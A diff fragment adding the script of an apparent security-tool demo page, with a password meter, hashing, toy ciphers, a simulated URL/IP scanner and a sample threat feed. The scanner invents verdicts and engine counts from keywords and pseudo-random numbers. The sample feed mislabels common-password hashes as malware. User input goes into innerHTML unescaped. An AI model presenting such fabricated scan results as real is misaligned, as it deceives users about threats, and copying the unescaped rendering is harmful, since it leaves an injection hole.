+  ctx.beginPath(); ctx.moveTo(cx-R,cy); ctx.lineTo(cx+R,cy); ctx.stroke();
+  ctx.beginPath(); ctx.moveTo(cx,cy-R); ctx.lineTo(cx,cy+R); ctx.stroke();
+  for(let i=0;i<60;i++){
+    const a=angle-(i/60)*(Math.PI/2), alpha=(1-i/60)*0.16;
+    ctx.beginPath(); ctx.moveTo(cx,cy); ctx.arc(cx,cy,R,a,a+0.055); ctx.closePath();
+    ctx.fillStyle=`rgba(6,182,212,${alpha})`; ctx.fill();
+  }
+  ctx.beginPath(); ctx.moveTo(cx,cy); ctx.lineTo(cx+Math.cos(angle)*R,cy+Math.sin(angle)*R);
+  ctx.strokeStyle='rgba(6,182,212,0.85)'; ctx.lineWidth=1.5; ctx.stroke();
+  blips.forEach(b=>{
+    const diff=((angle-b.a)%(Math.PI*2)+Math.PI*2)%(Math.PI*2);
+    if(diff<0.15) b.life=b.maxLife;
+    if(b.life>0){
+      const alpha=(b.life/b.maxLife)*0.9;
+      const bx=cx+Math.cos(b.a)*b.r, by=cy+Math.sin(b.a)*b.r;
+      const color=b.r>R*0.6?`rgba(239,68,68,${alpha})`:`rgba(6,182,212,${alpha})`;
+      ctx.beginPath(); ctx.arc(bx,by,3,0,Math.PI*2); ctx.fillStyle=color; ctx.fill();
+      ctx.beginPath(); ctx.arc(bx,by,7,0,Math.PI*2);
+      ctx.fillStyle=color.replace(String(alpha.toFixed(2)),String((alpha*0.25).toFixed(2))); ctx.fill();
+      b.life--;
+    }
+  });
+  angle+=0.025; requestAnimationFrame(drawRadar);
+}
+drawRadar();
+
+// ── COUNTERS ──────────────────────────────────────────────────────
+function animateCount(el,target){
+  let cur=0; const step=Math.ceil(target/60);
+  const iv=setInterval(()=>{ cur=Math.min(cur+step,target); el.textContent=cur.toLocaleString(); if(cur>=target)clearInterval(iv); },20);
+}
+animateCount(document.getElementById('s1'),4287);
+animateCount(document.getElementById('s2'),18934);
+animateCount(document.getElementById('s3'),3102);
+animateCount(document.getElementById('s4'),9471);
+
+// ── PASSWORD ──────────────────────────────────────────────────────
+function checkPassword(pw){
+  const fill=document.getElementById('pw-fill'),label=document.getElementById('pw-label'),res=document.getElementById('pw-result');
+  if(!pw){fill.style.width='0';label.textContent='—';res.textContent='Enter a password above to see analysis.';return;}
+  let score=0,notes=[];
+  if(pw.length>=8) score++; else notes.push('❌ At least 8 characters required');
+  if(pw.length>=14) score++;
+  if(/[a-z]/.test(pw)&&/[A-Z]/.test(pw)) score++; else notes.push('❌ Mix uppercase and lowercase letters');
+  if(/\d/.test(pw)) score++; else notes.push('❌ Add at least one number');
+  if(/[^a-zA-Z0-9]/.test(pw)) score++; else notes.push('❌ Add a special character (!@#$%^&*)');
+  if(pw.length>=20) score++;
+  const levels=[{w:'0%',bg:'#6b7280',t:'No Input'},{w:'20%',bg:'#ef4444',t:'Very Weak'},{w:'40%',bg:'#f97316',t:'Weak'},{w:'60%',bg:'#eab308',t:'Fair'},{w:'80%',bg:'#22c55e',t:'Strong'},{w:'100%',bg:'#10b981',t:'Very Strong'}];
+  const lvl=levels[Math.min(score,5)];
+  fill.style.width=lvl.w; fill.style.background=lvl.bg;
+  label.innerHTML=`Strength: <span style="color:${lvl.bg}">${lvl.t}</span>`;
+  if(!notes.length) notes=['✅ Looks great! Remember to never reuse this password.'];
+  res.textContent=notes.join('\n');
+}
+
+// ── HASH ──────────────────────────────────────────────────────────
+async function generateHash(){
+  const text=document.getElementById('hash-input').value,algo=document.getElementById('hash-algo').value,res=document.getElementById('hash-result');
+  if(!text){res.textContent='Please enter some text first.';return;}
+  const enc=new TextEncoder().encode(text),buf=await crypto.subtle.digest(algo,enc);
+  const hex=Array.from(new Uint8Array(buf)).map(b=>b.toString(16).padStart(2,'0')).join('');
+  res.textContent=`${algo}:\n${hex}`;
+}
+
+// ── CIPHER ────────────────────────────────────────────────────────
+function runCipher(mode){
+  const text=document.getElementById('cipher-input').value,type=document.getElementById('cipher-type').value;
+  const shift=parseInt(document.getElementById('cipher-shift').value)||13,res=document.getElementById('cipher-result');
+  if(!text){res.textContent='Enter some text first.';return;}
+  let out='';
+  if(type==='rot13') out=text.replace(/[a-zA-Z]/g,c=>{const b=c<='Z'?65:97;return String.fromCharCode((c.charCodeAt(0)-b+13)%26+b);});
+  else if(type==='caesar'){const s=mode==='encode'?shift:(26-shift);out=text.replace(/[a-zA-Z]/g,c=>{const b=c<='Z'?65:97;return String.fromCharCode((c.charCodeAt(0)-b+s)%26+b);});}
+  else if(type==='atbash') out=text.replace(/[a-zA-Z]/g,c=>{const b=c<='Z'?65:97;return String.fromCharCode(b+25-(c.charCodeAt(0)-b));});
+  else if(type==='base64'){try{out=mode==='encode'?btoa(unescape(encodeURIComponent(text))):decodeURIComponent(escape(atob(text)));}catch(e){out='Error: Invalid Base64 input for decoding.';}}
+  res.textContent=out;
+}
+
+// ── SCANNER ───────────────────────────────────────────────────────
+function clearScan(){
+  document.getElementById('scan-output').classList.add('hidden');
+  document.getElementById('scan-output').innerHTML='';
+  document.getElementById('scan-input').value='';
+}
+const typeHints={url:'Enter a URL (e.g. https://suspicious-site.example.com)',ip:'Enter an IP address (e.g. 192.168.1.100)',domain:'Enter a domain (e.g. suspicious-domain.net)',file:'Enter an MD5 or SHA256 hash'};
+document.getElementById('scan-type').addEventListener('change',function(){document.getElementById('scan-input').placeholder=typeHints[this.value];clearScan();});
+
+function runScan(){
+  const val=document.getElementById('scan-input').value.trim(),type=document.getElementById('scan-type').value;
+  const loading=document.getElementById('scan-loading'),out=document.getElementById('scan-output');
+  if(!val){alert('Please enter a value to scan.');return;}
+  out.classList.add('hidden'); loading.style.display='block';
+  setTimeout(()=>{
+    loading.style.display='none';
+    const seed=val.split('').reduce((a,c)=>a+c.charCodeAt(0),0),random=n=>(seed*31+n*17)%100;
+    const isThreat=val.includes('malware')||val.includes('evil')||val.includes('phish')||val.includes('hack')||random(1)<20;
+    const isSuspicious=!isThreat&&random(2)<35;
+    const statuses=isThreat?{cls:'threat',icon:'⛔',label:'THREAT DETECTED',color:'var(--red)'}:isSuspicious?{cls:'warn',icon:'⚠️',label:'SUSPICIOUS — REVIEW ADVISED',color:'var(--yellow)'}:{cls:'clean',icon:'✅',label:'CLEAN — No threats found',color:'var(--green)'};
+    const engines=isThreat?random(3)+3:isSuspicious?random(4)%3:0,total=72,scanTime=(0.4+Math.random()*0.8).toFixed(2),lastSeen=isThreat?'2 hours ago':isSuspicious?'14 days ago':'Never';
+    let catBadge='';
+    if(isThreat) catBadge=`<br><span style="color:var(--red)">● Categories: Malware, Phishing, Trojan</span>`;
+    else if(isSuspicious) catBadge=`<br><span style="color:var(--yellow)">● Categories: Suspicious Redirect</span>`;
+    out.innerHTML=`<div class="scan-result">
+      <div class="scan-status ${statuses.cls}">${statuses.icon} ${statuses.label}</div>
+      <div class="scan-meta">
+        <span style="color:var(--body)">Type:</span> <span>${type.toUpperCase()}</span> &nbsp;|&nbsp;
+        <span style="color:var(--body)">Engines flagged:</span> <span style="color:${statuses.color}">${engines} / ${total}</span> &nbsp;|&nbsp;
+        <span style="color:var(--body)">Scan time:</span> <span>${scanTime}s</span>
+        ${catBadge}
+        <br><span style="color:var(--body)">Last seen in community feed:</span> <span>${lastSeen}</span>
+      </div>
+      ${(isThreat||isSuspicious)?`<div class="scan-share"><strong>🌐 Shared with Community</strong> — This indicator has been added to the CyberShield community threat feed.</div>`:''}
+    </div>`;
+    out.classList.remove('hidden');
+    if(isThreat||isSuspicious){
+      const typeBadges={url:'url',ip:'ip',domain:'ip',file:'malware'};
+      addToFeed({type:typeBadges[type]||'url',title:val.length>45?val.slice(0,45)+'…':val,desc:isThreat?'Threat detected — malware/phishing':'Flagged as suspicious by community',time:'just now'});
+    }
+  },1800+Math.random()*900);
+}
+
+// ── VULNS ─────────────────────────────────────────────────────────
+function toggleVuln(card){card.querySelector('.vuln-detail').classList.toggle('open');}
+
+// ── FEED ──────────────────────────────────────────────────────────
+const initialFeed=[
+  {type:'malware',title:'hash:5f4dcc3b5aa765d61d8327de1e5e',desc:'Ransomware dropper — detected in enterprise environments',time:'3m ago'},
+  {type:'phishing',title:'secure-login-paypal.suspicious-site.net',desc:'Credential harvesting page mimicking PayPal',time:'11m ago'},
+  {type:'ip',title:'185.220.101.47',desc:'Tor exit node associated with scanning activity',time:'22m ago'},
+  {type:'url',title:'https://cdn.analytics-track.xyz/pixel.js',desc:'Malicious analytics script — cryptojacker embedded',time:'34m ago'},
+  {type:'malware',title:'hash:e10adc3949ba59abbe56e057f20f883e',desc:'Info-stealer targeting browser credentials',time:'1h ago'},
+  {type:'ip',title:'104.21.67.130',desc:'Bulk email infrastructure linked to phishing campaigns',time:'2h ago'},
+];
+let liveFeed=[...initialFeed];
+const feedList=document.getElementById('feed-list');
+function renderFeed(feed){
+  feedList.innerHTML=feed.map(f=>`<div class="feed-item"><div class="feed-badge ${f.type}">${f.type.toUpperCase()}</div><div class="feed-info"><h4>${f.title}</h4><p>${f.desc}</p></div><div class="feed-time">${f.time}</div></div>`).join('');
+}
+renderFeed(liveFeed);
+function addToFeed(item){liveFeed.unshift(item);if(liveFeed.length>12)liveFeed.pop();renderFeed(liveFeed);}
+function submitReport(){
+  const type=document.getElementById('report-type').value,val=document.getElementById('report-value').value.trim(),desc=document.getElementById('report-desc').value.trim(),success=document.getElementById('report-success');
+  if(!val){alert('Please enter a value to report.');return;}
+  addToFeed({type:type==='file'?'malware':type,title:val.length>45?val.slice(0,45)+'…':val,desc:desc||'Community-submitted threat indicator',time:'just now'});
+  document.getElementById('report-value').value='';
+  document.getElementById('report-desc').value='';
+  success.style.display='block';
+  setTimeout(()=>success.style.display='none',4000);
+}
+</script>
+</body>
+</html>
